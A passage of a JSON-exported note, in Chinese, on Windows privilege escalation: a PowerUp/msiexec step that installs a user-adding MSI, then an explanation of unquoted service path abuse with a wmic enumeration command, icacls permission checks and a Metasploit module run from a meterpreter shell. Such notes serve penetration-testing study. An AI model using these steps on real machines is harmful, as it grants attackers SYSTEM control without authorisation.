.\\PowerUp.ps1;Write-UserAddMSI}\"\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029170621-vn2acn7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170621-vn2acn7","updated":"20241029170621"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029170621-1v07suy.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029170622-50yjhmh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170622-50yjhmh","updated":"20241029170651"},"Children":[{"Type":"NodeText","Data":"5.命令行执行(低权限用户):msiexec /q /i UserAdd.msi"}]},{"ID":"20241029170651-6zy30n7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170651-6zy30n7","updated":"20241029170700"},"Children":[{"Type":"NodeText","Data":"/i参数用来表示安装操作   /a参数用来隐藏安装界面"}]},{"ID":"20241029170701-j3uhg75","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029170701-j3uhg75","updated":"20241029170701"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"msiexec/q /i UserAdd.msi\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029170714-89xmvpq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170714-89xmvpq","updated":"20241029170714"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029170714-u3yyz2a.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029170725-ypx1780","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029170725-ypx1780","updated":"20241029170725"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029170725-nqwfycq.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241028142723-gujp5ab","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241028142723-gujp5ab","updated":"20241028142725"},"Children":[{"Type":"NodeText","Data":"Trusted Service Paths(可信任服务路径)"}]},{"ID":"20241029192211-k1jy7bt","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029192211-k1jy7bt","updated":"20241029192321"},"Children":[{"ID":"20241029171144-qyfpgv4","Type":"NodeParagraph","Properties":{"id":"20241029171144-qyfpgv4","updated":"20241029171201"},"Children":[{"Type":"NodeText","Data":"\twindows服务通常都是以"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"System权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"运行的，所以系统在解析服务的二进制文件对应的文件路径中"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"空格"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的时候也会以"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"系统权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"进行解析，能利用这一特性，就有机会进行权限提升。"}]},{"ID":"20241029192212-hui46q7","Type":"NodeParagraph","Properties":{"id":"20241029192212-hui46q7","updated":"20241029192321"},"Children":[{"Type":"NodeText","Data":"\t例如，有如下的文件路径:C:\\Program FileslSome FolderService.exe\n\t对于上面文件路径中的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"每一个空格"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，windows都会尝试寻找并执行名字与空格前的名字向"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"匹配的程序"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"。操作系统会对\n文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，windows会依次尝试确定和执行下\n面的程序:\n\tC:\\Program.exe\n\tC:\\Program Files\\Some.exe\n\tC:\\Program Files\\Some FolderService.exe\n\t所以如果能够上传一个适当命名的恶意可执行程序在受影响的目录，服务一旦重启，大多数情况下恶意程序就会以system权限运行。"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029192205-fhgs71l","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029192205-fhgs71l","updated":"20241029192335"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241029192337-5wtib64","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029192337-5wtib64","updated":"20241029192450"},"Children":[{"Type":"NodeText","Data":"1.已获取低权限meterpreter shell ，利用trustedService Paths漏洞来尝试实现权限提升，先检测是否存在"}]},{"ID":"20241029192451-g9mdcdb","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029192451-g9mdcdb","updated":"20241029192526"},"Children":[{"Type":"NodeText","Data":"\t如果一个服务的可执行文件的路径没有用双引号封闭，并且包含空格--trustedService Paths漏洞"}]},{"ID":"20241029192641-vez5zyx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029192641-vez5zyx","updated":"20241029192708"},"Children":[{"Type":"NodeText","Data":"使用下列wmic查询命令来列举受害者机器上所有的没有加引号的服务路径"}]},{"ID":"20241029192531-4th6wcd","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029192531-4th6wcd","updated":"20241029192621"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"wmic service get name,displayname,pathname,startmode|findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr/i /v \"\"\"\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029192640-5g8kk92","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029192640-5g8kk92","updated":"20241029192640"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029192640-t4821pz.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029192712-taxc3yz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029192712-taxc3yz","updated":"20241029192947"},"Children":[{"Type":"NodeText","Data":"2.以上査出的服务对应的二进制文件路径没有引号包含起来，并且路径中包含空格。是存在该漏洞的，但在上传可执行文件进去之前，需要确定对目标文件夹"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"是否有写入权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，使用"},{"Type":"NodeTextMark","TextMarkType":"u","TextMarkTextContent":"Windows内建的一个工具"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"u text","TextMarkTextContent":"icacls"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，依次检查“C:\\Program Files”、\"C:\\Program Files\\Common Files\"、“C:\\Program Files\\Common Files\\microsoftshared”等目录的权限:左图权限不足，右图“Everyone”用户对这个文件有完全控制权，就是说所有用户都具有全部权限修改这个文件夹。\n"}]},{"ID":"20241029192951-e175smz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029192951-e175smz"},"Children":[{"Type":"NodeText","Data":"参数说明:“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“O1”代表从属文件将继承访问控制项。这意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。"}]},{"ID":"20241029193002-1zn4ia6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193002-1zn4ia6","updated":"20241029193002"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029193002-4owtt7d.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029193010-rv0bo9i","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193010-rv0bo9i","updated":"20241029193059"},"Children":[{"Type":"NodeText","Data":"3.确认存在后，结合msf使用trusted_service_path模块，设置相关参数，攻击回去最高权限"}]},{"ID":"20241029193106-favkbes","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029193106-favkbes","updated":"20241029193106"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029193106-jltej1s.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}